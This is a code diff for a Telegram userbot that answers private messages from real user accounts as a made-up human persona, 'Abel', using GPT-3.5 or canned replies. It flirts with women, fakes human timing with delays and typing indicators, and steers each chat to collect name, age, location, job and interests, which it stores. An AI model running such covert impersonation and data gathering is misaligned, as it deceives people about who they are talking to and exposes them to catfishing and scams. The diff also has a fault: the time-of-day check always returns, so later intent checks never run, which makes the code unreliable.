-    if any(word in message_lower for word in video_words):
+    if any(w in msg for w in ['video','clip']):
         return "video_request"
-    
-    # Check for meet
-    meet_words = ['meet', 'magenat', 'ማግኘት', 'see', 'come']
-    if any(word in message_lower for word in meet_words):
+    # Meet
+    if any(w in msg for w in ['meet','see each other','hang out']):
         return "meet"
-    
-    # Check for agreement (yes)
-    yes_words = ['yes', 'yeah', 'eshi', 'አዎ', 'እሺ', 'aw', 'ok', 'okay', 'esh']
-    if message_lower in yes_words or any(word == message_lower for word in yes_words):
+    # Yes/No
+    if msg in ['yes','yeah','yep','ya','ok','okay','sure']:
         return "agree"
-    
-    # Check for disagreement (no)
-    no_words = ['no', 'embi', 'አይ', 'አይደለም', 'aydelem']
-    if message_lower in no_words or any(word == message_lower for word in no_words):
+    if msg in ['no','nope','nah','not really']:
         return "disagree"
-    
-    # Check for thanks
-    thanks_words = ['thanks', 'thank you', 'thx', 'አመሰግናለሁ']
-    if any(word in message_lower for word in thanks_words):
+    # Thanks
+    if any(w in msg for w in ['thanks','thank you','thx']):
         return "thanks"
-    
-    # Check for goodbye
-    goodbye_words = ['bye', 'goodbye', 'see you', 'later', 'ደህና ሁን']
-    if any(word in message_lower for word in goodbye_words):
+    # Goodbye
+    if any(w in msg for w in ['bye','goodbye','see you','later']):
         return "goodbye"
-    
-    # Default
+    # Voice/media
+    if '[voice' in msg or 'voice message' in msg:
+        return "voice_received"
+    if '[photo' in msg or '[video' in msg or 'media' in msg:
+        return "media_received"
+    if 'http' in msg and '://' in msg:
+        return "link_received"
+    # Time of day
+    hour = datetime.now().hour
+    if hour < 12:
+        return "morning"
+    elif hour < 18:
+        return "afternoon"
+    else:
+        return "evening"
+    # Emotions
+    if any(w in msg for w in ['happy','glad','joy']):
+        return "happy"
+    if any(w in msg for w in ['sad','depressed','crying']):
+        return "sad"
+    if any(w in msg for w in ['bored','nothing']):
+        return "bored"
+    if any(w in msg for w in ['angry','mad','pissed']):
+        return "angry"
+    # Relationship
+    if any(w in msg for w in ['single','boyfriend','girlfriend','relationship']):
+        return "relationship"
+    # Family
+    if any(w in msg for w in ['family','mom','dad','sister','brother']):
+        return "family"
     return "default"
 
-# ==================== SIMPLE RESPONSE GENERATION ====================
+# ==================== RESPONSE GENERATION (Rule-Based + Optional AI) ====================
 
-def generate_response(intent, chat_id=None, message_text=None):
-    """Generate appropriate response"""
-    
-    user_info = conversation_memory.get_user_info(chat_id) if chat_id else None
-    
-    # Handle answering name question
-    if intent == "answering_name" and chat_id:
-        # User is answering our name question
+import os
+OPENAI_API_KEY = os.environ.get('OPENAI_API_KEY')
+
+def generate_ai_response(chat_id, message_text):
+    """Use OpenAI GPT-3.5-turbo to generate a reply."""
+    if not OPENAI_API_KEY:
+        return None
+    try:
+        import openai
+        openai.api_key = OPENAI_API_KEY
+
+        info = conversation_memory.get_user_info(chat_id)
+        gender = info.get('gender') or 'unknown'
+        name = info.get('name') or 'stranger'
+        history = info.get('chat_history', [])
+
+        system_prompt = (
+            f"You are Abel, a 25-year-old creative consultant and music producer from Los Angeles. "
+            f"You speak English, Amharic, and a little French. "
+            f"Your personality: confident, attentive, playful but respectful. "
+            f"If the user is female, be charming and subtly flirty. If male, be cool and like a genuine friend. "
+            f"Never ask for money, always lead the conversation naturally, ask interesting questions, "
+            f"and show genuine curiosity about the person. Use light emojis occasionally. "
+            f"The user's name is {name}, gender is {gender}. "
+            f"Refer to previous messages to maintain context. Keep replies natural, 1-3 sentences."
+        )
+
+        messages = [{"role": "system", "content": system_prompt}]
+        for h in history[-10:]:
+            messages.append(h)
+        messages.append({"role": "user", "content": message_text})
+
+        response = openai.ChatCompletion.create(
+            model="gpt-3.5-turbo",
+            messages=messages,
+            temperature=0.85,
+            max_tokens=150
+        )
+        reply = response['choices'][0]['message']['content'].strip()
+        conversation_memory.add_to_history(chat_id, "user", message_text)
+        conversation_memory.add_to_history(chat_id, "assistant", reply)
+        return reply
+    except Exception as e:
+        logger.error(f"AI response failed: {e}")
+        return None
+
+def generate_rule_based_response(intent, chat_id, message_text):
+    """Fallback rule-based generator using ABEL_REPLIES."""
+    user_info = conversation_memory.get_user_info(chat_id)
+    gender = user_info.get('gender')
+
+    # Answering flows
+    if intent == "answering_name":
         name = conversation_memory.extract_name(message_text)
         if name and name != "ASKING_MY_NAME":
             user_info['name'] = name
             conversation_memory.clear_waiting(chat_id)
-            
-            response = random.choice(TSEGA_REPLIES["user_tells_name"])
-            response = response.format(name)
-            
-            # Ask for age next
-            response += " " + random.choice(TSEGA_REPLIES["ask_age"])
+            conversation_memory.detect_gender(chat_id, message_text, name)
+            gender = user_info.get('gender')
+            if gender == 'female':
+                template = random.choice(ABEL_REPLIES["user_tells_name_female"])
+            elif gender == 'male':
+                template = random.choice(ABEL_REPLIES["user_tells_name_male"])
+            else:
+                template = random.choice(ABEL_REPLIES["user_tells_name_unknown"])
+            response = template.format(name=name)
+            response += " " + random.choice(ABEL_REPLIES["ask_age"])
             conversation_memory.set_waiting_for(chat_id, "age")
             return response
-    
-    # Handle answering age question
-    if intent == "answering_age" and chat_id:
-        import re
+        else:
+            conversation_memory.set_waiting_for(chat_id, "name")
+            return random.choice(ABEL_REPLIES["ask_name"])
+
+    if intent == "answering_age":
         age_match = re.search(r'(\d+)', message_text)
         if age_match:
             age = age_match.group(1)
             user_info['age'] = age
             conversation_memory.clear_waiting(chat_id)
-            
-            response = random.choice(TSEGA_REPLIES["user_tells_age"])
-            response = response.format(age)
-            
-            # Ask for location next
-            response += " " + random.choice(TSEGA_REPLIES["ask_location"])
+            response = random.choice(ABEL_REPLIES["user_tells_age"]).format(age=age)
+            response += " " + random.choice(ABEL_REPLIES["ask_location"])
             conversation_memory.set_waiting_for(chat_id, "location")
             return response
-    
-    # Handle user telling name (not as answer)
-    if intent == "user_tells_name" and chat_id:
+        else:
+            conversation_memory.set_waiting_for(chat_id, "age")
+            return random.choice(ABEL_REPLIES["ask_age"])
+
+    if intent == "answering_location":
+        loc = message_text.strip().title()
+        user_info['location'] = loc
+        conversation_memory.clear_waiting(chat_id)
+        response = random.choice(ABEL_REPLIES["user_tells_location"]).format(location=loc)
+        response += " " + random.choice(ABEL_REPLIES["ask_job"])
+        conversation_memory.set_waiting_for(chat_id, "job")
+        return response
+
+    if intent == "answering_job":
+        job = message_text.strip().title()
+        user_info['job'] = job
+        conversation_memory.clear_waiting(chat_id)
+        response = random.choice(ABEL_REPLIES["user_tells_job"]).format(job=job)
+        response += " " + random.choice(ABEL_REPLIES["ask_interests"])
+        conversation_memory.set_waiting_for(chat_id, "interests")
+        return response
+
+    if intent == "answering_interests":
+        user_info['interests'] = [x.strip() for x in message_text.split(',') if x.strip()]
+        conversation_memory.clear_waiting(chat_id)
+        return random.choice(ABEL_REPLIES["user_tells_interests"])
+
+    # Static intents
+    if intent == "greeting":
+        if gender == 'female':
+            return random.choice(ABEL_REPLIES["greeting_female"])
+        elif gender == 'male':
+            return random.choice(ABEL_REPLIES["greeting_male"])
+        else:
+            return random.choice(ABEL_REPLIES["greeting_unknown"])
+
+    if intent == "how_are_you":
+        if gender == 'female':
+            return random.choice(ABEL_REPLIES["how_are_you_female"])
+        elif gender == 'male':
+            return random.choice(ABEL_REPLIES["how_are_you_male"])
+        else:
+            return random.choice(ABEL_REPLIES["how_are_you_unknown"])
+
+    if intent == "what_doing":
+        if gender == 'female':
+            return random.choice(ABEL_REPLIES["what_doing_female"])
+        elif gender == 'male':
+            return random.choice(ABEL_REPLIES["what_doing_male"])
+        else:
+            return random.choice(ABEL_REPLIES["what_doing_unknown"])
+
+    if intent == "ask_name":
+        return random.choice(ABEL_REPLIES["ask_name"])
+
+    if intent == "user_tells_name":
         name = conversation_memory.extract_name(message_text)
         if name and name != "ASKING_MY_NAME":
             user_info['name'] = name
-            conversation_memory.clear_waiting(chat_id)
-            
-            response = random.choice(TSEGA_REPLIES["user_tells_name"])
-            response = response.format(name)
-            
-            # Ask for age naturally
-            response += " " + random.choice(TSEGA_REPLIES["ask_age"])
+            conversation_memory.detect_gender(chat_id, message_text, name)
+            gender = user_info.get('gender')
+            if gender == 'female':
+                response = random.choice(ABEL_REPLIES["user_tells_name_female"]).format(name=name)
+            elif gender == 'male':
+                response = random.choice(ABEL_REPLIES["user_tells_name_male"]).format(name=name)
+            else:
+                response = random.choice(ABEL_REPLIES["user_tells_name_unknown"]).format(name=name)
+            response += " " + random.choice(ABEL_REPLIES["ask_age"])
             conversation_memory.set_waiting_for(chat_id, "age")
             return response
-    
-    # Handle ask for my name
-    if intent == "ask_name":
-        user_info['asked_for_name'] = True
-        response = random.choice(TSEGA_REPLIES["introduce_myself"])
-        conversation_memory.set_waiting_for(chat_id, "name")
-        return response
-    
-    # Handle agreement
-    if intent == "agree":
-        return random.choice(TSEGA_REPLIES["agree"])
-    
-    # Handle disagreement
-    if intent == "disagree":
-        return random.choice(TSEGA_REPLIES["disagree"])
-    
-    # Handle voice/media
-    if intent == "voice_received" or "[Voice" in message_text:
-        return random.choice(TSEGA_REPLIES["voice_received"])
-    
-    if intent == "media_received" or "[Photo" in message_text or "[Video" in message_text:
-        return random.choice(TSEGA_REPLIES["media_received"])
-    
-    if intent == "link_received" or "http" in message_text.lower():
-        return random.choice(TSEGA_REPLIES["link_received"])
-    
-    # Get standard response for intent
-    templates = TSEGA_REPLIES.get(intent, TSEGA_REPLIES["default"])
-    response = random.choice(templates)
-    
-    # Personalize with name if known
-    if user_info and user_info.get('name'):
-        # Add name to beginning of response
-        response = f"{user_info['name']}, {response.lower()}"
-    
-    # Add emoji
-    sexy_emojis = ["😘", "💋", "💕", "😏", "💓", "🌹", "✨", "💫", "😉", "🔥"]
-    if random.random() < 0.4:
-        response += " " + random.choice(sexy_emojis)
-    
-    return response
+        else:
+            return random.choice(ABEL_REPLIES["ask_name"])
 
-# ==================== FIXED AUTO-REPLY HANDLER ====================
+    if intent == "ask_age":
+        return random.choice(ABEL_REPLIES["ask_age"])
+    if intent == "ask_location":
+        return random.choice(ABEL_REPLIES["ask_location"])
+    if intent == "ask_job":
+        return random.choice(ABEL_REPLIES["ask_job"])
+    if intent == "flirty":
+        if gender == 'female':
+            return random.choice(ABEL_REPLIES["flirty"])
+        else:
+            return random.choice(ABEL_REPLIES["default"])
+    if intent == "bro_compliment":
+        return random.choice(ABEL_REPLIES["bro_compliment"])
+
+    # All other intents
+    for key in ["money_mention","photo_request","video_request","meet","agree","disagree",
+                "confused","voice_received","media_received","link_received",
+                "morning","night","afternoon","evening","happy","sad","bored","angry",
+                "relationship","family","thanks","goodbye","default"]:
+        if intent == key:
+            return random.choice(ABEL_REPLIES.get(key, ABEL_REPLIES["default"]))
+
+    return random.choice(ABEL_REPLIES["default"])
+
+# ==================== MAIN AUTO‑REPLY HANDLER ====================
 
 async def auto_reply_handler(event, account_id):
-    """Handle incoming messages with intelligent responses"""
     try:
         if event.out:
             return
-        
         chat = await event.get_chat()
-        
-        # Only reply to private users
-        if hasattr(chat, 'title') and chat.title:
+        # Only private chats
+        if (hasattr(chat, 'title') and chat.title) or \
+           (hasattr(chat, 'participants_count') and chat.participants_count and chat.participants_count > 2):
             return
-        if hasattr(chat, 'participants_count') and chat.participants_count > 2:
-            return
-        
+
         chat_id = str(event.chat_id)
         message_text = event.message.text or ""
-        
-        # Check for media
-        has_media = event.message.media is not None
-        if has_media:
+
+        # Append media markers
+        if event.message.media:
             if hasattr(event.message.media, 'voice'):
                 message_text = "[Voice Message] " + message_text
             elif hasattr(event.message.media, 'photo'):
                 message_text = "[Photo] " + message_text
             elif hasattr(event.message.media, 'video'):
                 message_text = "[Video] " + message_text
-        
-        logger.info(f"📨 Message from {chat_id}: '{message_text}'")
-        
-        # Check if auto-reply is enabled
+
         account_key = str(account_id)
         if account_key not in reply_settings or not reply_settings[account_key].get('enabled', False):
             return
-        
-        # Detect intent
-        intent = detect_intent(message_text, chat_id)
-        logger.info(f"Detected intent: {intent}")
-        
-        # Generate response
-        response = generate_response(intent, chat_id, message_text)
-        
+
+        # Detect gender on every message
+        conversation_memory.detect_gender(chat_id, message_text)
+
+        # First, try AI if available
+        response = None
+        if OPENAI_API_KEY:
+            response = generate_ai_response(chat_id, message_text)
+
+        # Fallback to rule‑based
         if not response:
-            response = "ሰላም ውዴ! እንዴት ነህ? 😘"
-        
-        # Random delay between 15-40 seconds
+            intent = detect_intent(message_text, chat_id)
+            logger.info(f"Rule-based intent: {intent}")
+            response = generate_rule_based_response(intent, chat_id, message_text)
+            # Personalize with name
+            name = conversation_memory.get_user_info(chat_id).get('name')
+            if name and response:
+                # Avoid duplicating name if it's already in the response
+                if not response.startswith(name):
+                    response = f"{name}, {response[0].lower()}{response[1:]}" if response[0].isalpha() else f"{name} {response}"
+            # Ensure waiting_for is set appropriately (some intents may want to ask follow-ups)
+            if intent not in ["answering_name","answering_age","answering_location","answering_job","answering_interests",
+                              "greeting","how_are_you","what_doing","flirty","bro_compliment","default",
+                              "agree","disagree","confused","thanks","goodbye"]:
+                # If we haven't collected basic info yet, steer the conversation
+                info = conversation_memory.get_user_info(chat_id)
+                if not info['name']:
+                    conversation_memory.set_waiting_for(chat_id, "name")
+                elif not info['age']:
+                    conversation_memory.set_waiting_for(chat_id, "age")
+                elif not info['location']:
+                    conversation_memory.set_waiting_for(chat_id, "location")
+                elif not info['job']:
+                    conversation_memory.set_waiting_for(chat_id, "job")
+                elif not info['interests']:
+                    conversation_memory.set_waiting_for(chat_id, "interests")
+                else:
+                    conversation_memory.clear_waiting(chat_id)
+
+        if not response:
+            response = "Hey there! Abel here. What's on your mind? 😊"
+
+        # Emoji occasionally
+        if OPENAI_API_KEY is None:  # rule-based: add emoji
+            if random.random() < ABEL["emoji_frequency"]:
+                emojis = ["😉","😏","😎","😊","💯","🔥","😇"]
+                response += " " + random.choice(emojis)
+
+        # Delay 15-40 seconds
         delay = random.randint(15, 40)
-        logger.info(f"⏱️ Waiting {delay} seconds before replying...")
-        
-        # Show typing indicator
+        logger.info(f"Replying in {delay}s to {chat_id}")
         async with event.client.action(event.chat_id, 'typing'):
             await asyncio.sleep(delay)
-        
-        # Send reply
+
         await event.reply(response)
-        logger.info(f"✅ Replied after {delay}s: '{response[:50]}...'")
-        
+        logger.info(f"Sent to {chat_id}: {response[:80]}...")
+
+        # Store in conversation history (global log)
+        if account_key not in conversation_history:
+            conversation_history[account_key] = {}
+        if chat_id not in conversation_history[account_key]:
+            conversation_history[account_key][chat_id] = []
+        conversation_history[account_key][chat_id].append({
+            "role": "user", "text": message_text, "time": int(time.time())
+        })
+        conversation_history[account_key][chat_id].append({
+            "role": "assistant", "text": response, "time": int(time.time())
+        })
+        # Keep only last 50 messages
+        conversation_history[account_key][chat_id] = conversation_history[account_key][chat_id][-50:]
+        save_conversation_history()
+
     except Exception as e:
         logger.error(f"Error in auto-reply: {e}")
         try:
-            await event.reply("ሰላም ውዴ! ትንሽ እንነጋገር? 😘")
+            await event.reply("Hey! Something glitched, but I'm still here 😊")
         except:
             pass
-# ==================== ENHANCED AUTO-REPLY HANDLER ====================
 
+# ==================== START / STOP AUTO‑REPLY THREADS ====================
 
-
-# [REST OF YOUR CODE - everything after this point stays exactly the same]
-# Continue with start_auto_reply_for_account, keep_alive, all API routes, etc.
 async def start_auto_reply_for_account(account):
     """Start auto-reply listener with AUTO-RECONNECT capability"""
     account_id = account['id']
     account_key = str(account_id)
     reconnect_count = 0
-    
+
     while True:  # Infinite reconnect loop
         try:
             logger.info(f"Starting auto-reply for account {account_id} (attempt {reconnect_count + 1})")
-            
+
             # Create client with robust settings
             client = TelegramClient(
-                StringSession(account['session']), 
-                API_ID, 
+                StringSession(account['session']),
+                API_ID,
                 API_HASH,
                 connection_retries=10,
                 retry_delay=5,
@@ -891,39 +866,39 @@ async def start_auto_reply_for_account(account):
                 system_version="15.0",
                 app_version="8.4.1"
             )
-            
+
             await client.connect()
-            
+
             # Check authorization
             if not await client.is_user_authorized():
                 logger.error(f"Account {account_id} not authorized")
                 await asyncio.sleep(30)
                 reconnect_count += 1
                 continue
-            
+
             # Store client
             active_clients[account_key] = client
-            
-            # Define message handler
+
+            # Register event handler
             @client.on(NewMessage(incoming=True))
             async def handler(event):
                 await auto_reply_handler(event, account_id)
-            
+
             # Start client
             await client.start()
             logger.info(f"✅ Auto-reply ACTIVE for {account.get('name')} ({account.get('phone')})")
-            
+
             # Reset reconnect count on success
             reconnect_count = 0
-            
+
             # Keep running until disconnected
             await client.run_until_disconnected()
-            
+
         except Exception as e:
             logger.error(f"Connection lost for account {account_id}: {e}")
             if account_key in active_clients:
                 del active_clients[account_key]
-            
+
             # Exponential backoff for reconnection
             reconnect_count += 1
             wait_time = min(30 * reconnect_count, 300)  # Max 5 minutes
@@ -957,8 +932,8 @@ def start_all_auto_replies():
                 thread.start()
                 client_tasks[account_key] = thread
                 time.sleep(2)
+
 # ==================== AUTO-ADD MEMBER FEATURE - MULTI-SOURCE ===================
-# ==================== PROFESSIONAL AUTO-ADD SYSTEM ====================
 
 auto_add_settings = {}
 AUTO_ADD_FILE = 'auto_add_settings.json'
